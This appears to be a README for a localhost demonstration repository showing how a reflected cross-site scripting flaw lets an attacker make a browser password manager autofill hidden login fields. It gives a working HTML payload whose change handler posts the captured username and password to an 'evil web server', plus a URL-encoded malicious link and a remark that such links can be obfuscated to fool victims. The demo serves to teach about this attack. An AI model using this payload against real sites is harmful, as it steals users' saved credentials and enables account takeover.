## Credential Theft

This demonstration shows how a browser-based password manager can be tricked into autofilling user credentials by attacker-provided login fields.

This repository contains two actors.

- Users that have an account registered at a reflected XSS vulnerable website
- An attacker, who is targeting to steal the credentials of other users

For the sake of this demonstration, the website and the evil web server run on the localhost.

Conditions:\
The exploit only works if the user has one credential pair for the origin of the website saved in a browser-based password manager and autofill is enabled (tested on: Firefox and Chrome).

Installation steps:

1. Install Node.js and npm
2. Clone the repository, navigate to directory threat model and install dependencies by running `npm install`
3. Make sure nothing is running on ports 8000 and 5000 yet.
4. Run `npm run start-vulnerable-website`
5. Run `npm run start-evil-webserver`

---

1. Visit http://localhost:5000/login, enter some fake credentials (access is granted in any cases) and click the login button.
2. Click save on the appearing doorhanger to store the credentials with the password manager.
3. You a redirected to http://localhost:5000/comment. Write some comment to see, what the web application is supposed to do and what the URL looks like.
4. To test the credential exploit on yourself, enter the following payload in the comment box. The fetch request to the evil web server localhost:8000, containing the exfiltrated credentials, can be seen in the Web Developer Toolbox under the tab "Network".

```
<input style="display: none" name="username" id="username" />
<input
  style="display: none"
  type="password"
  name="password"
  onchange='if(this.value.length)fetch("http://localhost:8000",{
    method:"POST",
    headers: {
      "Content-Type": "application/json"
    },
    mode: "no-cors",
    body:JSON.stringify({
      "username":username.value,
      "password":this.value
    })
    })'
/>
```

5. In a real attack scenario the attacker would need to convince a user to visit the following URL, which contains the the attacker-provided payload. The URL could additionally be obfuscated to make it look less suspicious. \
   \
   Malicious URL containing the attacker's payload:\
   http://localhost:5000/comment?comment=%3Cinput+style%3D%22display%3A+none%22+name%3Dusername+id%3Dusername%3E%0D%0A%3Cinput+style%3D%22display%3A+none%22+type%3Dpassword+name%3Dpassword+id%3Dpassword+onchange%3D%22if%28this.value.length%29fetch%28%27http%3A%2F%2Flocalhost%3A8000%27%2C%7B%0D%0Amethod%3A%27POST%27%2C%0D%0Amode%3A+%27no-cors%27%2C%0D%0Abody%3Ausername.value%2B%27%3A%27%2Bthis.value%0D%0A%7D%29%3B%22%3E
